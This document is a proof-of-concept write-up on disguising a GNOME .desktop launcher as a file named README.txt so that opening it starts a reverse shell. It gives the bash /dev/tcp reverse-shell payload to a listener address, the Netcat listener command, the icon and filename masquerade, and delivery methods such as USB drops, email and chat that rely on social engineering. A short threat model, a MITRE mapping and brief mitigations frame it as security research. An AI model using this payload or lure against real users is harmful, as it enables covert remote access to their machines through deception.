# Reverse Shell Delivery via `.desktop` Launcher


## Objective

- Disguise an executable reverse shell as a trusted, text-based document  
- Deliver the payload in a single file, with no external dependencies  
- Trigger a reverse shell back to a Kali Linux listener upon click

---

## Threat Model

### Attacker Goals

- Gain an interactive remote shell on the target system  
- Maintain stealth through social engineering and file disguise  
- Avoid detection by not requiring administrative privileges or file downloads  

### Assumptions

- The victim uses a GNOME-based Linux desktop (e.g., Ubuntu)
- The user is socially engineered into trusting and launching the disguised file  
- The target machine has outbound network access to the attacker's listener  

### Attacker Capabilities

- Ability to craft a malicious `.desktop` launcher with a reverse shell payload  
- Means of delivering the file to the target (e.g., via USB, phishing, shared folder)  
- Control over a listener machine to receive incoming connections (Kali with `nc`)  

### Victim Environment

- User operates under a non-restricted Linux desktop environment  
- No outbound firewall blocking the reverse shell connection  
- Default GNOME behavior is intact (trust prompt on `.desktop` files)

---

## MITRE ATT&CK Techniques

The following table maps the techniques used in this proof-of-concept to the [MITRE ATT&CK Framework](https://attack.mitre.org/):

| Tactic                  | Technique                                 | ID            | Description |
|-------------------------|-------------------------------------------|---------------|-------------|
| **Initial Access**      | User Execution: Malicious File            | [T1204.002](https://attack.mitre.org/techniques/T1204/002/) | The `.desktop` file is disguised as a benign `README.txt` to trick the user into executing it. |
| **Execution**           | Command and Scripting Interpreter: Bash   | [T1059.004](https://attack.mitre.org/techniques/T1059/004/) | Bash is used to execute the reverse shell payload. |
| **Defense Evasion**     | Masquerading                              | [T1036](https://attack.mitre.org/techniques/T1036/) | The launcher file mimics a `.txt` document with a text icon and filename. |
| **Command and Control** | Application Layer Protocol: Custom TCP    | [T1071.001](https://attack.mitre.org/techniques/T1071/001/) | The reverse shell uses a raw TCP connection (via Netcat). |

---

### Limitations

- Requires user interaction (file must be trusted and launched)  
- The payload runs with the user’s privileges (not root)  
- Network-dependent: reverse shell fails if outbound traffic is blocked   

### Mitigations

- Disable `.desktop` file execution from user-writable directories  
- Enforce outbound firewall rules or use network segmentation  
- Improve user awareness through training against disguised file traps  

---

## Implementation Details

### File: `README.txt.desktop`

- **Filename shown to user:** `README.txt`  
- **Real extension:** `.desktop` (GNOME launcher)  
- **Icon used:** `text-x-generic` (appears like a text file)  
- **Trust method:** GNOME “Allow Launching” system  

### Payload Logic

```bash
bash -c 'bash -i >& /dev/tcp/192.168.1.14/6969 0>&1'
```
---

## Deployment and Execution

### Attacker Setup (Kali Linux)

The attacker prepares a Netcat listener on port `6969` to receive the reverse shell connection:

```bash
nc -lvnp 6969
```
### Victim Interaction

The attacker delivers the `README.txt.desktop` file to the target system. Possible delivery methods include:

- USB drop (removable media left in a shared area)
- File sharing platforms (e.g., shared folders, cloud drives)
- Email attachment (if not filtered)
- Direct messaging (Slack, Discord, etc.)

The user must:

1. Save the file to their Desktop.
2. **Right-click the file and select "Allow Launching"**. This is required to make the launcher executable in GNOME.
3. Double-click the file to run it.
4. Once launched, the payload executes silently and initiates a reverse shell to the attacker.

If the user does not manually allow launching, the file will remain inert and appear as plain text.


---

## Screenshots

- Disguised file on Desktop  
  ![Disguised File]([images/disguised-file.png])

- User manually selects “Allow Launching”  
  `![Allow Launching](images/allow-launching.png)`

- Reverse shell connection received  
  `![Shell Connected](images/shell-connected.png)`

---

## Conclusion

This proof-of-concept demonstrates how `.desktop` launcher files can be leveraged to gain remote shell access through basic user interaction and visual deception. Despite its simplicity, this method is capable of bypassing technical defenses when paired with effective social engineering.
